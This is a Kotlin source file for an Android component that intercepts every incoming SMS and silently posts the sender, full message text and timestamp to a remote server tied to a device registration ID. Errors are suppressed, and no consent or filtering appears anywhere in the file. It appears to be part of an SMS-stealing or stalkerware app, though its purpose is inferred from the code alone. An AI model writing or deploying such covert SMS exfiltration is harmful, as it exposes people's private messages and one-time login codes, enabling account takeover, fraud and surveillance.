package com.screenlink.remote

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return

        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent) ?: return
        if (messages.isEmpty()) return

        val sender = messages[0].originatingAddress.orEmpty()
        val body = messages.joinToString("") { it.messageBody.orEmpty() }
        val timestamp = messages[0].timestampMillis

        val pending = goAsync()

        Executors.newSingleThreadExecutor().execute {
            try {
                post(context, sender, body, timestamp)
            } finally {
                pending.finish()
            }
        }
    }

    private fun post(context: Context, sender: String, body: String, timestamp: Long) {
        var connection: HttpURLConnection? = null
        try {
            val rid = context.getSharedPreferences("viral_prefs", Context.MODE_PRIVATE)
                .getString("registration_id", "").orEmpty()

            if (rid.isBlank()) return

            connection = URL("${TpcService.API_BASE_URL}/devices/sms/incoming")
                .openConnection() as HttpURLConnection

            connection.requestMethod = "POST"
            connection.connectTimeout = 12_000
            connection.readTimeout = 12_000
            connection.doOutput = true
            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")

            val payload = JSONObject().apply {
                put("registration_id", rid)
                put("address", sender)
                put("body", body)
                put("direction", "in")
                put("received_at", timestamp)
            }.toString()

            connection.outputStream.use { it.write(payload.toByteArray(Charsets.UTF_8)) }
            connection.responseCode
        } catch (_: Exception) {
        } finally {
            connection?.disconnect()
        }
    }
}